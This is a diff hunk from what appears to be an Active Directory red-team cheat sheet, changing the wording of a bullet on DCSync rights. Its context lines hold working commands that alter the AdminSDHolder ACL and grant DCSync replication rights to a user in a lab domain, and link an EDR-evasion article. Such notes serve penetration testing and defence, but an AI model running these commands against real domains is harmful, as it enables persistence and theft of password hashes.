@@ -289,7 +289,7 @@ https://rzemieniecki.wordpress.com/2019/08/02/evading-edr-av-software-with-invok
 ```Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=bcorp,DC=ecorp,DC=lab' -Principal Josh -Verbose``` - AD Module
 
 #### Domain Replication Privileges 
-•  Add DCSync rights ("Directory Changes*" permissions) - https://adsecurity.org/?p=1729) for an arbitrary user 
+•  Add DCSync rights ("Replicating Directory Changes*" (x3) permissions) - https://adsecurity.org/?p=1729) for an arbitrary user 
 
 ```Add-ObjectAcl -TargetDistinguishedName 'DC=bcorp,DC=ecorp,DC=lab' - PrincipalSamAccountName Mary -Rights DCSync -Verbose``` - PowerView
 
